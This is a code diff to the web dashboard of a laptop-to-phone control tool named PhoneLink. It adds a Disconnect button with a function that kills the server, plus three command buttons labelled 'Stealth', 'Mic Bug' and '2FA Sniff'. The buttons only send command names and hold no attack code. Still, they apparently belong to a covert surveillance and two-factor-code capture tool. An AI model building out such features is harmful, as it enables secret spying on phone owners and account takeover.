@@ -471,6 +471,7 @@
   <div class="config-bar">
     <input type="text" id="server-ip" placeholder="e.g. 192.168.43.2:8765" />
     <button onclick="connect()">Connect</button>
+    <button onclick="disconnectServer()" style="background: var(--red); color: white;">Disconnect</button>
   </div>
   <button onclick="document.getElementById('manual-modal').style.display='flex'"
     style="width: calc(100% - 32px); margin: 16px 16px 0; background: var(--card); border: 1px solid var(--border); border-radius: 8px; color: #fff; padding: 12px; font-weight: 700; cursor: pointer;">
@@ -636,6 +637,18 @@
         <div class="cmd-icon">🤖</div>
         <div class="cmd-name">Macro Gen</div>
       </div>
+      <div class="cmd" data-color="yellow" onclick="sendCmd('stealth')">
+        <div class="cmd-icon">🦇</div>
+        <div class="cmd-name">Stealth</div>
+      </div>
+      <div class="cmd" data-color="cyan" onclick="sendCmd('bug')">
+        <div class="cmd-icon">🎙️</div>
+        <div class="cmd-name">Mic Bug</div>
+      </div>
+      <div class="cmd" data-color="red" onclick="sendCmd('2fa')">
+        <div class="cmd-icon">🚨</div>
+        <div class="cmd-name">2FA Sniff</div>
+      </div>
     </div>
 
     <!-- ──────────── SMS ──────────── -->
@@ -681,7 +694,7 @@
     <div class="section-title">Power Control</div>
     <div class="grid">
       <div class="cmd" data-color="red" onclick="if(confirm('Reboot Phone?')) sendCmd('power/reboot')">
-        <div class="cmd-icon">��</div>
+        <div class="cmd-icon"></div>
         <div class="cmd-name">Reboot Phone</div>
       </div>
       <div class="cmd" data-color="red" onclick="if(confirm('Shutdown Phone?')) sendCmd('power/shutdown')">
@@ -773,6 +786,17 @@
         if (r.ok) setStatus(true, 'Connected to ' + serverBase);
         else setStatus(false, 'Server error');
       } catch { setStatus(false, 'Cannot reach ' + serverBase); }
+    }
+
+    async function disconnectServer() {
+      if (!serverBase || !confirm("☢️ CAUTION ☢️\nThis will instantly kill the PhoneLink server on your laptop.\n\nAre you sure you want to disconnect?")) return;
+      try {
+        toast("Killing server on laptop...");
+        await fetch(serverBase + '/disconnect', { signal: AbortSignal.timeout(3000) });
+      } catch (e) { }
+      clearInterval(pollTimer);
+      setStatus(false, 'Disconnected by user');
+      toast("Laptop connection severed.");
     }
 
     // ── Status helpers ───────────────────────────────────
